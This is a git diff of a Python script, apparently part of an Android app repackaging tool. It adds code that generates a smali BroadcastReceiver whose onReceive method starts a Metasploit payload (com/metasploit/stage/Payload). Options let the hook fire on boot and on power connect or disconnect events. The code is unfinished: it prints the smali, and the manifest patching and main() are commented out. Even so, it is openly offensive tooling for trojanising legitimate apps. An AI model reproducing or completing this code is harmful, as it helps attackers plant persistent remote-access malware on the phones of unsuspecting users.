@@ -50,7 +50,40 @@ def __fix_manifest(manifest_path):
     pass
 
 def __inject_smali():
-    pass
+    global path
+    replace = ".class public Lmalicious/edu/broadcastreceivertest/BroadcastLauncher;"
+    smali = ".class public L" + path + "/BroadcastLauncher;\n"
+    smali += """.super Landroid/content/BroadcastReceiver;
+.source "BroadcastLauncher.java"
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 8
+    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
+    .locals 0
+    .param p1, "context"    # Landroid/content/Context;
+    .param p2, "intent"    # Landroid/content/Intent;"""
+
+    invoke = "invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V\n"
+    smali += invoke
+
+    smali += """.prologue
+    .line 12
+    return-void
+.end method"""
+
+    print(smali)
 
 def inject_broadcast_hook(manifest_path, payload_path, on_power_connected=False, on_power_disconnected=False, on_boot_completed=False):
     """
@@ -83,37 +116,11 @@ def inject_broadcast_hook(manifest_path, payload_path, on_power_connected=False,
     obc = on_boot_completed
 
     __inject_smali()
-    __fix_manifest(manifest_path)
+    #__fix_manifest(manifest_path)
 
-    smali = """.class public Lmalicious/edu/broadcastreceivertest/BroadcastLauncher;
-    .super Landroid/content/BroadcastReceiver;
-    .source "BroadcastLauncher.java"
+    
 
+#def main():
+#    inject_broadcast_hook("/home/moe/Dokumente/Packadroid/Automated_Repackager/pythonFiles/broadcasthook/AndroidManifest.xml","/com/metasploit/stage/", True, True, True)
 
-    # direct methods
-    .method public constructor <init>()V
-        .locals 0
-
-        .prologue
-        .line 8
-        invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
-
-        return-void
-    .end method
-
-
-    # virtual methods
-    .method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
-        .locals 0
-        .param p1, "context"    # Landroid/content/Context;
-        .param p2, "intent"    # Landroid/content/Intent;
-
-        .prologue
-        .line 12
-        return-void
-    .end method"""
-
-def main():
-    inject_broadcast_hook("/home/moe/Dokumente/Packadroid/Automated_Repackager/pythonFiles/broadcasthook/AndroidManifest.xml","", True, True, True)
-
-main()
+#main()
